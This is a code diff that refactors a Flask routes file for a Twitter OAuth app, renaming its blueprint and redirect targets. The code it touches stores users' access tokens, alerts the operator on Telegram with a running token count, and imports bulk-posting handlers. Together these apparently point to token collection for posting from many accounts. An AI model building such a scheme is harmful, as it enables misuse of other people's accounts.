@@ -3,13 +3,12 @@ import requests
 from helpers import (
     generate_code_verifier_and_challenge, send_message_via_telegram, post_tweet,
     get_twitter_username_and_profile, generate_random_string, handle_post_single,
-    handle_post_bulk, handle_refresh_single, handle_refresh_bulk, refresh_token_in_db
+    handle_post_bulk, handle_refresh_single, handle_refresh_bulk
 )
 from database import store_token, get_all_tokens, get_total_tokens
 from config import Config
 
-# Set up Blueprint for routes
-app = Blueprint('routes', __name__)
+app = Blueprint('app', __name__)
 
 @app.route('/')
 def home():
@@ -19,7 +18,7 @@ def home():
 
     if 'username' in session:
         send_message_via_telegram(f"👋 @{session['username']} just returned to the website.")
-        return redirect(url_for('routes.welcome'))
+        return redirect(url_for('app.welcome'))
 
     if request.args.get('authorize') == 'true':
         state = "0"
@@ -68,7 +67,7 @@ def home():
                     f"👤 Username: @{username}\n"
                     f"📊 Total Tokens in Database: {total_tokens}"
                 )
-                return redirect(url_for('routes.welcome'))
+                return redirect(url_for('app.welcome'))
             else:
                 return "Error retrieving user info with access token", 400
 
@@ -84,7 +83,7 @@ def welcome():
     username = session.get('username', 'User')
     
     if 'refresh_token' in session:
-        access_token, refresh_token = refresh_token_in_db(session['refresh_token'], username)
+        access_token, refresh_token = handle_refresh_single(session['refresh_token'], username)
         if access_token and refresh_token:
             session['access_token'] = access_token
             session['refresh_token'] = refresh_token
@@ -94,7 +93,7 @@ def welcome():
 @app.route('/logout')
 def logout():
     session.clear()
-    return redirect(url_for('routes.home'))
+    return redirect(url_for('app.home'))
 
 @app.route('/webhook', methods=['POST'])
 def telegram_webhook():
